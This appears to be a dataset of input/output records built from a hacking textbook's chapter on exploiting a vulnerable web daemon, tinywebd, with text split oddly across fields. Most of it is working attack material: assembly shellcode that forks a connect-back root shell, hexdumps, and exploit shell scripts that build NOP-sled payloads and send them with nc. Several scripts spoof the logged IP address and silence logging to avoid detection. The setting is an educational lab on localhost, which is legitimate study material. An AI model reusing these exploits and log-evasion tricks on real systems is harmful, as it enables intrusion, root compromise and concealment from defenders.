[esp+4],eax\n0x08048f7a <main+487>: mov eax,ds:0x804a970\n0x08048f7f <main+492>: mov DWORD PTR [esp],eax\n0x08048f82 <main+495>: call 0x80488d0 <accept@plt>\n0x08048f87 <main+500>: mov DWORD PTR [ebp-12],eax\n0x08048f8a <main+503>: cmp DWORD PTR [ebp-12],0xffffffff\n0x08048f8e <main+507>: jne 0x8048f9c <main+521>\n0x08048f90 <main+509>: mov DWORD PTR [esp],0x804962e\n0x08048f97 <main+516>: call 0x8048ac4 <fatal>\n0x08048f9c <main+521>: mov eax,ds:0x804a96c\n0x08048fa1 <main+526>: mov DWORD PTR [esp+8],eax\n0x08048fa5 <main+530>: lea eax,[ebp-56]\n0x08048fa8 <main+533>: mov DWORD PTR [esp+4],eax\n0x08048fac <main+537>: mov eax,DWORD PTR [ebp-12]\n0x08048faf <main+540>: mov DWORD PTR [esp],eax\n0x08048fb2 <main+543>: call 0x8048fb9 <handle_connection>\n0x08048fb7 <main+548>: jmp 0x8048f65 <main+466>\nEnd of assembler dump.\n(gdb)\nAll three of these addresses basically go to the same place. Let’s\nuse0x08048fb7 since this is the original return address used for the call to\nhandle_connection(). However, there are other things we need to fix first.\nLook at the function prologue and epilogue for handle_connection(). These\nare the instructions that set up and remove the stack frame structures on\nthe stack.\n(gdb) disass handle_connection\nDump of assembler code for function handle_connection:\n0x08048fb9 <handle_connection+0>: push ebp\n0x08048fba <handle_connection+1>: mov ebp,esp\n0x08048fbc <handle_connection+3>: push ebx\n0x08048fbd <handle_connection+4>: sub esp,0x644\n0x08048fc3 <handle_connection+10>: lea eax,[ebp-0x218]\n0x08048fc9 <handle_connection+16>: mov DWORD PTR [esp+4],eax\n0x08048fcd <handle_connection+20>: mov eax,DWORD PTR [ebp+8]\n0x08048fd0 <handle_connection+23>: mov DWORD PTR [esp],eax\n0x08048fd3 <handle_connection+26>: call 0x8048cb0 <recv_line>\n0x08048fd8 <handle_connection+31>: mov DWORD PTR [ebp-0x620],eax\n0x08048fde <handle_connection+37>: mov eax,DWORD PTR [ebp+12]\n0x08048fe1 <handle_connection+40>: movzx eax,WORD PTR [eax+2]\n0x08048fe5 <handle_connection+44>: mov DWORD PTR [esp],eax\n0x08048fe8 <handle_connection+47>: call 0x80488f0 <ntohs@plt>\n.:[ output trimmed ]:.\n0x08049302 <handle_connection+841>: call 0x8048850 <write@plt>\nCountermeasures 341\n0x08049307 <handle_connection+846>: mov DWORD PTR [esp+4],0x2\n0x0804930f <handle_connection+854>: mov eax,DWORD PTR [ebp+8]\n0x08049312 <handle_connection+857>: mov DWORD PTR [esp],eax\n0x08049315 <handle_connection+860>: call 0x8048800 <shutdown@plt>\n0x0804931a <handle_connection+865>: add esp,0x644\n0x08049320 <handle_connection+871>: pop ebx\n0x08049321 <handle_connection+872>: pop ebp\n0x08049322 <handle_connection+873>: ret\nEnd of assembler dump.\n(gdb)\nAt the beginning of the function, the function prologue saves the current\nvalues of the EBP and EBX registers by pushing them to the stack, and sets\nEBP to the current value of ESP so it can be used as a point of reference for\naccessing stack variables. Finally, 0x644 bytes are saved on the stack for these\nstack variables by subtracting from ESP. The function epilogue at the end\nrestores ESP by adding 0x644 back to it and restores the saved values of EBX\nand EBP by popping them from the stack back into the registers.\nThe overwrite instructions are actually found in the recv_line() func-\ntion; however, they write to data in the handle_connection() stack frame, so\nthe overwrite itself happens in handle_connection(). The return address that\nwe overwrite is pushed to the stack when handle_connection() is called, so the\nsaved values for EBP and EBX pushed to the stack in the function prologue\nwill be between the return address and the corruptible buffer. This means\nthat EBP and EBX will get mangled when the function epilogue executes.\nSince we don’t gain control of the program’s execution until the return\ninstruction, all the instructions between the overwrite and the return instruc-\ntion must be executed. First, we need to assess how much collateral damage\nisdone by these extra instructions after the overwrite. The assembly instruct-\nion int3 creates the byte 0xcc, which is literally a debugging breakpoint.\nThe shellcode below uses an int3 instruction instead of exiting. This break-\npoint will be caught by GDB, allowing us to examine the exact state of the\nprogram after the shellcode executes.\nmark_break.s\nBITS 32\n; Mark the filesystem to prove you ran.\njmp short one\ntwo:\npop ebx ; Filename\nxor ecx, ecx\nmov BYTE [ebx+7], cl ; Null terminate filename\npush BYTE 0x5 ; Open()\npop eax\nmov WORD cx, 0x441 ; O_WRONLY|O_APPEND|O_CREAT\nxor edx, edx\nmov WORD dx, 0x180 ; S_IRUSR|S_IWUSR\nint 0x80 ; Open file to create it.\n; eax = returned file descriptor\nmov ebx, eax ; File descriptor to second arg\n342 0x600\npush BYTE 0x6 ; Close ()\npop eax\nint 0x80 ; Close file.\nint3 ; zinterrupt\none:\ncall two\ndb \"/HackedX\"\nTo use this shellcode, first get GDB set up to debug the tinyweb daemon.\nIn the output below, a breakpoint is set right before handle_connection() is\ncalled. The goal is to restore the mangled registers to their original state\nfound at this breakpoint.\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ ps aux | grep tinywebd\nroot 23497 0.0 0.0 1636 356 ? Ss 17:08 0:00 ./tinywebd\nreader 23506 0.0 0.0 2880 748 pts/1 R+ 17:09 0:00 grep tinywebd\nreader@hacking:~/booksrc $ gcc -g tinywebd.c\nreader@hacking:~/booksrc $ sudo gdb -q -pid=23497 --symbols=./a.out\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nAttaching to process 23497\n/cow/home/reader/booksrc/tinywebd: No such file or directory.\nA program is being debugged already. Kill it? (y or n) n\nProgram not killed.\n(gdb) set dis intel\n(gdb) x/5i main+533\n0x8048fa8 <main+533>: mov DWORD PTR [esp+4],eax\n0x8048fac <main+537>: mov eax,DWORD PTR [ebp-12]\n0x8048faf <main+540>: mov DWORD PTR [esp],eax\n0x8048fb2 <main+543>: call 0x8048fb9 <handle_connection>\n0x8048fb7 <main+548>: jmp 0x8048f65 <main+466>\n(gdb) break *0x8048fb2\nBreakpoint 1 at 0x8048fb2: file tinywebd.c, line 72.\n(gdb) cont\nContinuing.\nIn the output above, a breakpoint is set right before handle_connection() is\ncalled (shown in bold). Then, in another terminal window, the exploit tool is\nused to throw the new shellcode at it. This will advance execution to the break-\npoint in the other terminal.\nreader@hacking:~/booksrc $ nasm mark_break.s\nreader@hacking:~/booksrc $ ./xtool_tinywebd.sh mark_break 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: mark_break (44 bytes)\n[NOP (372 bytes)] [shellcode (44 bytes)] [ret addr (128 bytes)]\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $\nCountermeasures 343\nBack in the debugging terminal, the first breakpoint is encountered.\nSome important stack registers are displayed, which show the stack setup\nbefore (and after) the handle_connection() call. Then, execution continues\nto the int3 instruction in the shellcode, which acts like a breakpoint. Then\nthese stack registers are checked again to view their state at the moment the\nshellcode begins to execute.\nBreakpoint 1, 0x08048fb2 in main () at tinywebd.c:72\n72 handle_connection(new_sockfd, &client_addr, logfd);\n(gdb) i r esp ebx ebp\nesp 0xbffff7e0 0xbffff7e0\nebx 0xb7fd5ff4 -1208131596\nebp 0xbffff848 0xbffff848\n(gdb) cont\nContinuing.\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n0xbffff753 in ?? ()\n(gdb) i r esp ebx ebp\nesp 0xbffff7e0 0xbffff7e0\nebx 0x6 6\nebp 0xbffff624 0xbffff624\n(gdb)\nThis output shows that EBX and EBP are changed at the point the shell-\ncode begins execution. However, an inspection of the instructions in main()’s\ndisassembly shows that EBX isn’t actually used. The compiler probably saved\nthis register to the stack due to some rule about calling convention, even\nthough it isn’t really used. EBP, however, is used heavily, since it’s the point\nof reference for all local stack variables. Because the original saved value of\nEBP was overwritten by our exploit, the original value must be recreated.\nWhen EBP is restored to its original value, the shellcode should be able\ntodo its dirty work and then return back into main() as usual. Since com-\nputers are deterministic, the assembly instructions will clearly explain how\ntodo all this.\n(gdb) set dis intel\n(gdb) x/5i main\n0x8048d93 <main>: push ebp\n0x8048d94 <main+1>: mov ebp,esp\n0x8048d96 <main+3>: sub esp,0x68\n0x8048d99 <main+6>: and esp,0xfffffff0\n0x8048d9c <main+9>: mov eax,0x0\n(gdb) x/5i main+533\n0x8048fa8 <main+533>: mov DWORD PTR [esp+4],eax\n0x8048fac <main+537>: mov eax,DWORD PTR [ebp-12]\n0x8048faf <main+540>: mov DWORD PTR [esp],eax\n0x8048fb2 <main+543>: call 0x8048fb9 <handle_connection>\n0x8048fb7 <main+548>: jmp 0x8048f65 <main+466>\n(gdb)\n344 0x600\nA quick glance at the function prologue for main() shows that EBP should\nbe 0x68 bytes larger than ESP. Since ESP wasn’t damaged by our exploit, we\ncan restore the value for EBP by adding 0x68 to ESP at the end of our shell-\ncode. With EBP restored to the proper value, the program execution can\nbe safely returned into the connection-accepting loop. The proper return\naddress for the handle_connection() call is the instruction found after the call\nat0x08048fb7. The following shellcode uses this technique.\nmark_restore.s\nBITS 32\n; Mark the filesystem to prove you ran.\njmp short one\ntwo:\npop ebx ; Filename\nxor ecx, ecx\nmov BYTE [ebx+7], cl ; Null terminate filename\npush BYTE 0x5 ; Open()\npop eax\nmov WORD cx, 0x441 ; O_WRONLY|O_APPEND|O_CREAT\nxor edx, edx\nmov WORD dx, 0x180 ; S_IRUSR|S_IWUSR\nint 0x80 ; Open file to create it.\n; eax = returned file descriptor\nmov ebx, eax ; File descriptor to second arg\npush BYTE 0x6 ; Close ()\npop eax\nint 0x80 ; close file\nlea ebp, [esp+0x68] ; Restore EBP.\npush 0x08048fb7 ; Return address.\nret ; Return\none:\ncall two\ndb \"/HackedX\"\nWhen assembled and used in an exploit, this shellcode will restore the\ntinyweb daemon’s execution after marking the filesystem. The tinyweb\ndaemon doesn’t even know that something happened.\nreader@hacking:~/booksrc $ nasm mark_restore.s\nreader@hacking:~/booksrc $ hexdump -C mark_restore\n00000000 eb 26 5b 31 c9 88 4b 07 6a 05 58 66 b9 41 04 31 |.&[1.K.j.Xf.A.1|\n00000010 d2 66 ba 80 01 cd 80 89 c3 6a 06 58 cd 80 8d 6c |.f....j.X..l|\n00000020 24 68 68 b7 8f 04 08 c3 e8 d5 ff ff ff 2f 48 61 |$hh...../Ha|\n00000030 63 6b 65 64 58 |ckedX|\n00000035\nreader@hacking:~/booksrc $ sudo rm /Hacked\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh mark_restore 127.0.0.1\ntarget IP: 127.0.0.1\nCountermeasures 345"
  },
  {
    "input": "0x653 Child Laborers",
    "output": "shellcode: mark_restore (53 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request (15 b)] [NOP (348 b)] [shellcode (53 b)] [ret addr (128 b)]\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $ ls -l /Hacked\n-rw------- 1 root reader 0 2007-09-19 20:37 /Hacked\nreader@hacking:~/booksrc $ ps aux | grep tinywebd\nroot 26787 0.0 0.0 1636 420 ? Ss 20:37 0:00 ./tinywebd\nreader 26828 0.0 0.0 2880 748 pts/1 R+ 20:38 0:00 grep tinywebd\nreader@hacking:~/booksrc $ ./webserver_id 127.0.0.1\nThe web server for 127.0.0.1 is Tiny webserver\nreader@hacking:~/booksrc $\n0x653 Child Laborers\nNow that the difficult part is figured out, we can use this technique to silently\nspawn a root shell. Since the shell is interactive, but we still want the process\nto handle web requests, we need to fork to a child process. The fork() call\ncreates a child process that is an exact copy of the parent, except that it returns\n0 in the child process and the new process ID in the parent process. We want\nour shellcode to fork and the child process to serve up the root shell, while\nthe parent process restores tinywebd’s execution. In the shellcode below,\nseveral instructions are added to the start of loopback_shell.s. First, the fork\nsyscall is made, and the return value is put in the EAX register. The next few\ninstructions test to see if EAX is zero. If EAX is zero, we jump to child_process\nto spawn the shell. Otherwise, we’re in the parent process, so the shellcode\nrestores execution into tinywebd.\nloopback_shell_restore.s\nBITS 32\npush BYTE 0x02 ; Fork is syscall #2\npop eax\nint 0x80 ; After the fork, in child process eax == 0.\ntest eax, eax\njz child_process ; In child process spawns a shell.\n; In the parent process, restore tinywebd.\nlea ebp, [esp+0x68] ; Restore EBP.\npush 0x08048fb7 ; Return address.\nret ; Return\nchild_process:\n; s = socket(2, 1, 0)\npush BYTE 0x66 ; Socketcall is syscall #102 (0x66)\npop eax\ncdq ; Zero out edx for use as a null DWORD later.\nxor ebx, ebx ; ebx is the type of socketcall.\ninc ebx ; 1 = SYS_SOCKET = socket()\n346 0x600\npush edx ; Build arg array: { protocol = 0,\npush BYTE 0x1 ; (in reverse) SOCK_STREAM = 1,\npush BYTE 0x2 ; AF_INET = 2 }\nmov ecx, esp ; ecx = ptr to argument array\nint 0x80 ; After syscall, eax has socket file descriptor.\n.: [ Output trimmed; the rest is the same as loopback_shell.s. ] :.\nThe following listing shows this shellcode in use. Multiple jobs are used\ninstead of multiple terminals, so the netcat listener is sent to the background\nby ending the command with an ampersand (&). After the shell connects\nback, the fg command brings the listener back to the foreground. The process\nis then suspended by hitting CTRL-Z, which returns to the BASH shell. It might\nbe easier for you to use multiple terminals as you are following along, but job\ncontrol is useful to know for those times when you don’t have the luxury of\nmultiple terminals.\nreader@hacking:~/booksrc $ nasm loopback_shell_restore.s\nreader@hacking:~/booksrc $ hexdump -C loopback_shell_restore\n00000000 6a 02 58 cd 80 85 c0 74 0a 8d 6c 24 68 68 b7 8f |j.X..t.l$hh.|\n00000010 04 08 c3 6a 66 58 99 31 db 43 52 6a 01 6a 02 89 |..jfX.1.CRj.j.|\n00000020 e1 cd 80 96 6a 66 58 43 68 7f bb bb 01 66 89 54 |..jfXCh..f.T|\n00000030 24 01 66 68 7a 69 66 53 89 e1 6a 10 51 56 89 e1 |$.fhzifS.j.QV.|\n00000040 43 cd 80 87 f3 87 ce 49 b0 3f cd 80 49 79 f9 b0 |C...I.?.Iy.|\n00000050 0b 52 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 52 89 |.Rh//shh/bin.R.|\n00000060 e2 53 89 e1 cd 80 |.S..|\n00000066\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ nc -l -p 31337 &\n[1] 27279\nreader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh loopback_shell_restore 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: loopback_shell_restore (102 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request (15 b)] [NOP (299 b)] [shellcode (102 b)] [ret addr (128 b)]\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $ fg\nnc -l -p 31337\nwhoami\nroot\n[1]+ Stopped nc -l -p 31337\nreader@hacking:~/booksrc $ ./webserver_id 127.0.0.1\nThe web server for 127.0.0.1 is Tiny webserver\nreader@hacking:~/booksrc $ fg\nnc -l -p 31337\nwhoami\nroot\nWith this shellcode, the connect-back root shell is maintained by a\nseparate child process, while the parent process continues to serve web\ncontent.\nCountermeasures 347"
  },
  {
    "input": "0x661 Spoofing the Logged IP Address",
    "output": "0x660 Advanced Camouflage\nOur current stealth exploit only camouflages the web request; however, the\nIP address and timestamp are still written to the log file. This type of camou-\nflage will make the attacks harder to find, but they are not invisible. Having\nyour IP address written to logs that could be kept for years might lead to\ntrouble in the future. Since we’re mucking around with the insides of the\ntinyweb daemon now, we should be able to hide our presence even better.\n0x661 Spoofing the Logged IP Address\nThe IP address written to the log file comes from the client_addr_ptr, which is\npassed to handle_connection().\nCode Segment from tinywebd.c\nvoid handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) {\nunsigned char *ptr, request[500], resource[500], log_buffer[500];\nint fd, length;\nlength = recv_line(sockfd, request);\nsprintf(log_buffer, \"From %s:%d \\\"%s\\\"\\t\", inet_ntoa(client_addr_ptr->sin_addr),\nntohs(client_addr_ptr->sin_port), request);\nTo spoof the IP address, we just need to inject our own sockaddr_in\nstructure and overwrite the client_addr_ptr with the address of the injected\nstructure. The best way to generate a sockaddr_in structure for injection is to\nwrite a little C program that creates and dumps the structure. The following\nsource code builds the struct using command-line arguments and then writes\nthe struct data directly to file descriptor 1, which is standard output.\naddr_struct.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\nint main(int argc, char *argv[]) {\nstruct sockaddr_in addr;\nif(argc != 3) {\nprintf(\"Usage: %s <target IP> <target port>\\n\", argv[0]);\nexit(0);\n}\naddr.sin_family = AF_INET;\naddr.sin_port = htons(atoi(argv[2]));\naddr.sin_addr.s_addr = inet_addr(argv[1]);\nwrite(1, &addr, sizeof(struct sockaddr_in));\n}\n348 0x600\nThis program can be used to inject a sockaddr_in structure. The output\nbelow shows the program being compiled and executed.\nreader@hacking:~/booksrc $ gcc -o addr_struct addr_struct.c\nreader@hacking:~/booksrc $ ./addr_struct 12.34.56.78 9090\n##\n\"8N_reader@hacking:~/booksrc $\nreader@hacking:~/booksrc $ ./addr_struct 12.34.56.78 9090 | hexdump -C\n00000000 02 00 23 82 0c 22 38 4e 00 00 00 00 f4 5f fd b7 |.#.\"8N..._.|\n00000010\nreader@hacking:~/booksrc $\nTo integrate this into our exploit, the address structure is injected after\nthe fake request but before the NOP sled. Since the fake request is 15 bytes\nlong and we know the buffer starts at 0xbffff5c0, the fake address will be\ninjected at 0xbfffff5cf.\nreader@hacking:~/booksrc $ grep 0x xtool_tinywebd_steath.sh\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # at +100 bytes from buffer @ 0xbffff5c0\nreader@hacking:~/booksrc $ gdb -q -batch -ex \"p /x 0xbffff5c0 + 15\"\n$1 = 0xbffff5cf\nreader@hacking:~/booksrc $\nSince the client_addr_ptr is passed as a second function argument, it will\nbe on the stack two dwords after the return address. The following exploit\nscript injects a fake address structure and overwrites client_addr_ptr.\nxtool_tinywebd_spoof.sh\n#!/bin/sh\n# IP spoofing stealth exploitation tool for tinywebd\nSPOOFIP=\"12.34.56.78\"\nSPOOFPORT=\"9090\"\nif [ -z \"$2\" ]; then # If argument 2 is blank\necho \"Usage: $0 <shellcode file> <target IP>\"\nexit\nfi\nFAKEREQUEST=\"GET / HTTP/1.1\\x00\"\nFR_SIZE=$(perl -e \"print \\\"$FAKEREQUEST\\\"\" | wc -c | cut -f1 -d ' ')\nOFFSET=540\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # At +100 bytes from buffer @ 0xbffff5c0\nFAKEADDR=\"\\xcf\\xf5\\xff\\xbf\" # +15 bytes from buffer @ 0xbffff5c0\necho \"target IP: $2\"\nSIZE=`wc -c $1 | cut -f1 -d ' '`\necho \"shellcode: $1 ($SIZE bytes)\"\necho \"fake request: \\\"$FAKEREQUEST\\\" ($FR_SIZE bytes)\"\nALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE - 16))\necho \"[Fake Request $FR_SIZE] [spoof IP 16] [NOP $ALIGNED_SLED_SIZE] [shellcode $SIZE] [ret\naddr 128] [*fake_addr 8]\"\nCountermeasures 349\n(perl -e \"print \\\"$FAKEREQUEST\\\"\";\n./addr_struct \"$SPOOFIP\" \"$SPOOFPORT\";\nperl -e \"print \\\"\\x90\\\"x$ALIGNED_SLED_SIZE\";\ncat $1;\nperl -e \"print \\\"$RETADDR\\\"x32 . \\\"$FAKEADDR\\\"x2 . \\\"\\r\\n\\\"\") | nc -w 1 -v $2 80\nThe best way to explain exactly what this exploit script does is to watch\ntinywebd from within GDB. In the output below, GDB is used to attach to the\nrunning tinywebd process, breakpoints are set before the overflow, and the\nIP portion of the log buffer is generated.\nreader@hacking:~/booksrc $ ps aux | grep tinywebd\nroot 27264 0.0 0.0 1636 420 ? Ss 20:47 0:00 ./tinywebd\nreader 30648 0.0 0.0 2880 748 pts/2 R+ 22:29 0:00 grep tinywebd\nreader@hacking:~/booksrc $ gcc -g tinywebd.c\nreader@hacking:~/booksrc $ sudo gdb -q—pid=27264 --symbols=./a.out\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nAttaching to process 27264\n/cow/home/reader/booksrc/tinywebd: No such file or directory.\nA program is being debugged already. Kill it? (y or n) n\nProgram not killed.\n(gdb) list handle_connection\n77 /* This function handles the connection on the passed socket from the\n78 * passed client address and logs to the passed FD. The connection is\n79 * processed as a web request, and this function replies over the connected\n80 * socket. Finally, the passed socket is closed at the end of the function.\n81 */\n82 void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) {\n83 unsigned char *ptr, request[500], resource[500], log_buffer[500];\n84 int fd, length;\n85\n86 length = recv_line(sockfd, request);\n(gdb)\n87\n88 sprintf(log_buffer, \"From %s:%d \\\"%s\\\"\\t\", inet_ntoa(client_addr_ptr->sin_addr),\nntohs(client_addr_ptr->sin_port), request);\n89\n90 ptr = strstr(request, \" HTTP/\"); // Search for valid looking request.\n91 if(ptr == NULL) { // Then this isn't valid HTTP\n92 strcat(log_buffer, \" NOT HTTP!\\n\");\n93 } else {\n94 *ptr = 0; // Terminate the buffer at the end of the URL.\n95 ptr = NULL; // Set ptr to NULL (used to flag for an invalid request).\n96 if(strncmp(request, \"GET \", 4) == 0) // Get request\n(gdb) break 86\nBreakpoint 1 at 0x8048fc3: file tinywebd.c, line 86.\n(gdb) break 89\nBreakpoint 2 at 0x8049028: file tinywebd.c, line 89.\n(gdb) cont\nContinuing.\n350 0x600\nThen, from another terminal, the new spoofing exploit is used to advance\nexecution in the debugger.\nreader@hacking:~/booksrc $ ./xtool_tinywebd_spoof.sh mark_restore 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: mark_restore (53 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request 15] [spoof IP 16] [NOP 332] [shellcode 53] [ret addr 128]\n[*fake_addr 8]\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $\nBack in the debugging terminal, the first breakpoint is hit.\nBreakpoint 1, handle_connection (sockfd=9, client_addr_ptr=0xbffff810, logfd=3) at\ntinywebd.c:86\n86 length = recv_line(sockfd, request);\n(gdb) bt\n#0 handle_connection (sockfd=9, client_addr_ptr=0xbffff810, logfd=3) at tinywebd.c:86\n#1 0x08048fb7 in main () at tinywebd.c:72\n(gdb) print client_addr_ptr\n$1 = (struct sockaddr_in *) 0xbffff810\n(gdb) print *client_addr_ptr\n$2 = {sin_family = 2, sin_port = 15284, sin_addr = {s_addr = 16777343},\nsin_zero = \"\\000\\000\\000\\000\\000\\000\\000\"}\n(gdb) x/x &client_addr_ptr\n0xbffff7e4: 0xbffff810\n(gdb) x/24x request + 500\n0xbffff7b4: 0xbffff624 0xbffff624 0xbffff624 0xbffff624\n0xbffff7c4: 0xbffff624 0xbffff624 0x0804b030 0xbffff624\n0xbffff7d4: 0x00000009 0xbffff848 0x08048fb7 0x00000009\n0xbffff7e4: 0xbffff810 0x00000003 0xbffff838 0x00000004\n0xbffff7f4: 0x00000000 0x00000000 0x08048a30 0x00000000\n0xbffff804: 0x0804a8c0 0xbffff818 0x00000010 0x3bb40002\n(gdb) cont\nContinuing.\nBreakpoint 2, handle_connection (sockfd=-1073744433, client_addr_ptr=0xbffff5cf, logfd=2560)\nat tinywebd.c:90\n90 ptr = strstr(request, \" HTTP/\"); // Search for valid-looking request.\n(gdb) x/24x request + 500\n0xbffff7b4: 0xbffff624 0xbffff624 0xbffff624 0xbffff624\n0xbffff7c4: 0xbffff624 0xbffff624 0xbffff624 0xbffff624\n0xbffff7d4: 0xbffff624 0xbffff624 0xbffff624 0xbffff5cf\n0xbffff7e4: 0xbffff5cf 0x00000a00 0xbffff838 0x00000004\n0xbffff7f4: 0x00000000 0x00000000 0x08048a30 0x00000000\n0xbffff804: 0x0804a8c0 0xbffff818 0x00000010 0x3bb40002\n(gdb) print client_addr_ptr\n$3 = (struct sockaddr_in *) 0xbffff5cf\n(gdb) print client_addr_ptr\n$4 = (struct sockaddr_in *) 0xbffff5cf\n(gdb) print *client_addr_ptr\n$5 = {sin_family = 2, sin_port = 33315, sin_addr = {s_addr = 1312301580},\nCountermeasures 351"
  },
  {
    "input": "0x662 Logless Exploitation",
    "output": "sin_zero = \"\\000\\000\\000\\000_\n(gdb) x/s log_buffer\n0xbffff1c0: \"From 12.34.56.78:9090 \\\"GET / HTTP/1.1\\\"\\t\"\n(gdb)\nAt the first breakpoint, client_addr_ptr is shown to be at 0xbffff7e4 and\npointing to 0xbffff810. This is found in memory on the stack two dwords after\nthe return address. The second breakpoint is after the overwrite, so the\nclient_addr_ptr at 0xbffff7e4 is shown to be overwritten with the address\nofthe injected sockaddr_in structure at 0xbffff5cf. From here, we can peek\natthe log_buffer before it’s written out to the log to verify the address\ninjection worked.\n0x662 Logless Exploitation\nIdeally, we want to leave no trace at all. In the setup on the LiveCD, technically\nyou can just delete the log files after you get a root shell. However, let’s assume\nthis program is part of a secure infrastructure where the log files are mirrored\nto a secure logging server that has minimal access or maybe even a line\nprinter. In these cases, deleting the log files after the fact is not an option.\nThe timestamp() function in the tinyweb daemon tries to be secure by writing\ndirectly to an open file descriptor. We can’t stop this function from being\ncalled, and we can’t undo the write it does to the log file. This would be a\nfairly effective countermeasure; however, it was implemented poorly. In fact,\nin the previous exploit, we stumbled upon this problem.\nEven though logfd is a global variable, it is also passed to handle_connection()\nas a function argument. From the discussion of functional context, you should\nremember that this creates another stack variable with the same name, logfd.\nSince this argument is found right after the client_addr_ptr on the stack, it\ngets partially overwritten by the null terminator and the extra 0x0a byte found\nat the end of the exploit buffer.\n(gdb) x/xw &client_addr_ptr\n0xbffff7e4: 0xbffff5cf\n(gdb) x/xw &logfd\n0xbffff7e8: 0x00000a00\n(gdb) x/4xb &logfd\n0xbffff7e8: 0x00 0x0a 0x00 0x00\n(gdb) x/8xb &client_addr_ptr\n0xbffff7e4: 0xcf 0xf5 0xff 0xbf 0x00 0x0a 0x00 0x00\n(gdb) p logfd\n$6 = 2560\n(gdb) quit\nThe program is running. Quit anyway (and detach it)? (y or n) y\nDetaching from program: , process 27264\nreader@hacking:~/booksrc $ sudo kill 27264\nreader@hacking:~/booksrc $\nAs long as the log file descriptor doesn’t happen to be 2560 (0x0a00 in\nhexadecimal), every time handle_connection() tries to write to the log it will\nfail. This effect can be quickly explored using strace. In the output below,\n352 0x600\nstrace is used with the -p command-line argument to attach to a running\nprocess. The -e trace=write argument tells strace to only look at write calls.\nOnce again, the spoofing exploit tool is used in another terminal to connect\nand advance execution.\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ ps aux | grep tinywebd\nroot 478 0.0 0.0 1636 420 ? Ss 23:24 0:00 ./tinywebd\nreader 525 0.0 0.0 2880 748 pts/1 R+ 23:24 0:00 grep tinywebd\nreader@hacking:~/booksrc $ sudo strace -p 478 -e trace=write\nProcess 478 attached - interrupt to quit\nwrite(2560, \"09/19/2007 23:29:30> \", 21) = -1 EBADF (Bad file descriptor)\nwrite(2560, \"From 12.34.56.78:9090 \\\"GET / HTT\".., 47) = -1 EBADF (Bad file descriptor)\nProcess 478 detached\nreader@hacking:~/booksrc $\nThis output clearly shows the attempts to write to the log file failing.\nNormally, we wouldn’t be able to overwrite the logfd variable, since the\nclient_addr_ptr is in the way. Carelessly mangling this pointer will usually\nlead to a crash. But since we’ve made sure this variable points to valid memory\n(our injected spoofed address structure), we’re free to overwrite the vari-\nables that lie beyond it. Since the tinyweb daemon redirects standard out to\n/dev/null, the next exploit script will overwrite the passed logfd variable\nwith 1, for standard output. This will still prevent entries from being written\nto the log file but in a much nicer way—without errors.\nxtool_tinywebd_silent.sh\n#!/bin/sh\n# Silent stealth exploitation tool for tinywebd\n# also spoofs IP address stored in memory\nSPOOFIP=”12.34.56.78\"\nSPOOFPORT=\"9090\"\nif [ -z \"$2\" ]; then # If argument 2 is blank\necho \"Usage: $0 <shellcode file> <target IP>\"\nexit\nfi\nFAKEREQUEST=\"GET / HTTP/1.1\\x00\"\nFR_SIZE=$(perl -e \"print \\\"$FAKEREQUEST\\\"\" | wc -c | cut -f1 -d ' ')\nOFFSET=540\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # At +100 bytes from buffer @ 0xbffff5c0\nFAKEADDR=\"\\xcf\\xf5\\xff\\xbf\" # +15 bytes from buffer @ 0xbffff5c0\necho \"target IP: $2\"\nSIZE=`wc -c $1 | cut -f1 -d ' '`\necho \"shellcode: $1 ($SIZE bytes)\"\necho \"fake request: \\\"$FAKEREQUEST\\\" ($FR_SIZE bytes)\"\nALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE - 16))\necho \"[Fake Request $FR_SIZE] [spoof IP 16] [NOP $ALIGNED_SLED_SIZE] [shellcode $SIZE] [ret\naddr 128] [*fake_addr 8]\"\nCountermeasures 353"
  },
  {
    "input": "0x670 The Whole Infrastructure",
